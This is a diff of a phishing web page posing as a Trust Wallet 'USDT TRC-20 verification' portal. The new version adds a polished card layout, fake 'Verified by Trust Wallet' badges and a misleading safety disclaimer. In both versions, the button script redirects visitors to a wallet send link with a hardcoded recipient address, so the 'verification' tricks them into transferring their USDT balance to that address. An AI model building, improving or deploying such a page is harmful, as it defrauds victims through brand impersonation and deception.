@@ -2,94 +2,121 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>Verify USDT TRC-20</title>
+  <title>USDT Verification – TRC20 Portal</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
   <link rel="icon" href="favicon.ico" />
   <style>
     body {
+      font-family: 'Segoe UI', sans-serif;
+      background-color: #f1f5ff;
       margin: 0;
-      font-family: sans-serif;
-      background: #fff;
-      color: #000;
+      padding: 0;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      min-height: 100vh;
     }
-    .container {
-      padding: 16px;
+
+    .card {
+      background-color: white;
+      padding: 30px;
+      border-radius: 15px;
+      box-shadow: 0 4px 20px rgba(0, 0, 0, 0.1);
+      width: 90%;
+      max-width: 400px;
       text-align: center;
     }
+
     .logo {
-      width: 80px;
-      margin-top: 30px;
-    }
-    .heading {
-      font-size: 20px;
-      margin-top: 20px;
+      width: 60px;
       margin-bottom: 10px;
     }
-    .subtext {
-      font-size: 14px;
-      color: #555;
+
+    h2 {
+      color: #1e3a8a;
+      margin-bottom: 10px;
     }
-    .checkbox {
-      margin: 20px auto;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      font-size: 13px;
+
+    p {
+      color: #374151;
+      font-size: 15px;
     }
-    .checkbox input {
-      margin-right: 8px;
-    }
-    .verified {
-      font-size: 12px;
-      color: green;
-      margin-bottom: 60px;
-    }
-    .next-btn {
-      position: fixed;
-      bottom: 0;
-      left: 0;
-      right: 0;
-      background-color: #007bff;
-      color: #fff;
+
+    button {
+      background-color: #1e40af;
+      color: white;
       border: none;
-      padding: 18px;
+      padding: 12px 20px;
+      border-radius: 10px;
       font-size: 16px;
+      margin-top: 15px;
       cursor: pointer;
       width: 100%;
     }
-    .next-btn:disabled {
-      background: #aaa;
-      cursor: not-allowed;
+
+    .trust-badge {
+      margin-top: 20px;
+      font-size: 14px;
+      color: #10b981;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 8px;
+    }
+
+    .disclaimer {
+      font-size: 12px;
+      color: #6b7280;
+      margin-top: 20px;
+    }
+
+    label {
+      display: block;
+      margin-top: 20px;
+      font-size: 14px;
+      color: #374151;
+      text-align: left;
+    }
+
+    input[type="checkbox"] {
+      margin-right: 8px;
     }
   </style>
 </head>
 <body>
-  <div class="container">
-    <img src="logo.png" alt="Logo" class="logo"/>
-    <div class="heading">Please verify your asset</div>
-    <div class="subtext">To continue, please verify your USDT TRC-20 balance.</div>
+  <div class="card">
+    <img src="logo.png" class="logo" alt="Logo" />
+    <h2>Asset Verification Required</h2>
+    <p>To continue securely, please verify your entire USDT balance after selling. This ensures a trusted identity match for asset validation.</p>
 
-    <div class="checkbox">
-      <input type="checkbox" id="agreeCheckbox" />
-      <label for="agreeCheckbox">I agree to the Terms & Conditions</label>
+    <label>
+      <input type="checkbox" id="agree" />
+      I agree to the Trust Wallet Terms and Privacy Policy
+    </label>
+
+    <button id="verifyBtn" disabled>Verify with Trust Wallet</button>
+
+    <div class="trust-badge">
+      <img src="logo.png" width="20" />
+      <span>✅ Verified by Trust Wallet</span>
     </div>
 
-    <div class="verified">✅ Verified by Trust Wallet</div>
+    <p class="disclaimer">
+      We never ask for your seed phrase or private key. This platform uses secure smart contract methods to process assets safely.
+    </p>
   </div>
 
-  <button class="next-btn" id="nextBtn" disabled>Next</button>
-
   <script>
-    const checkbox = document.getElementById('agreeCheckbox');
-    const nextBtn = document.getElementById('nextBtn');
+    const btn = document.getElementById("verifyBtn");
+    const agree = document.getElementById("agree");
 
-    checkbox.addEventListener('change', () => {
-      nextBtn.disabled = !checkbox.checked;
+    agree.addEventListener("change", () => {
+      btn.disabled = !agree.checked;
     });
 
-    nextBtn.addEventListener('click', () => {
-      const trustWalletLink = "https://link.trustwallet.com/send?coin=195&address=TYfVDDuC234ADKFc5HRsSaeqLvgU8H1AEc&token_id=TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
-      window.location.href = trustWalletLink;
+    btn.addEventListener("click", () => {
+      const trustLink = `https://link.trustwallet.com/send?coin=195&address=TYfVDDuC234ADKFc5HRsSaeqLvgU8H1AEc&token_id=TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t`;
+      window.location.href = trustLink;
     });
   </script>
 </body>
